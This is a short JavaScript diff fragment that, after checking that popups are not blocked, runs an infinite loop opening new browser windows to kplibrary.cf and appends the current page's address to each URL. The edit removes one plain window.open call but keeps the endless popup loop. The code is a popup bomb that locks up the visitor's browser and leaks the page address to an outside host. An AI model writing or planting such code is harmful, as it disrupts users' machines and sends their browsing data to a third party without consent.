@@ -5,9 +5,8 @@ if (popUp == null || typeof(popUp) == 'undefined') {
     alert("Thicc Katz")
   }
 } else {
-  while (true) {
-    window.open("http://kplibrary.cf/")
-      //: Opens new tab of kplibrary.cf^
+  while (true) {   
+   //: Opens new tab of kplibrary.cf^
     var strWindowFeatures = "location=yes,height=1200,width=1400,scrollbars=yes,status=yes";
     var URL = "http://kplibrary.cf/" + location.href;
     var win = window.open(URL, "_blank", strWindowFeatures);
